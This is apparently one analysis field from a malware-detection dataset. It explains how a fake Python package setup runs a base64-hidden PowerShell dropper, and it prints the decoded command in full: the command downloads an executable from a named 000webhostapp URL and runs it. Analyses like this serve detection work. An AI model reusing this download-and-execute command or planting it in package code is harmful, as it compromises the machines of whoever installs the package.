      "malicious_behavior": "This code is malicious. It attempts to execute a hidden PowerShell command using a base64-encoded payload. The command is run only if a file or directory named 'tahg' does not exist, likely as a simple persistence or anti-analysis check. The encoded PowerShell command decodes to: 'powershell Invoke-WebRequest -Uri \"https://esqueleslt.000webhostapp.com/xEsquelesquad.exe\" -OutFile \"~/WindowsCache.exe\"; Invoke-Expression \"~/WindowsCache.exe\"', which downloads and executes a Windows executable from a remote server. This behavior is typical of malware droppers or downloaders, which fetch and run additional malicious payloads on the victim's machine. The use of hidden windows and encoded commands is intended to evade detection. The rest of the code is a decoy, mimicking a legitimate Python package setup. This code can compromise the security of the system by downloading and executing arbitrary code from the internet.",
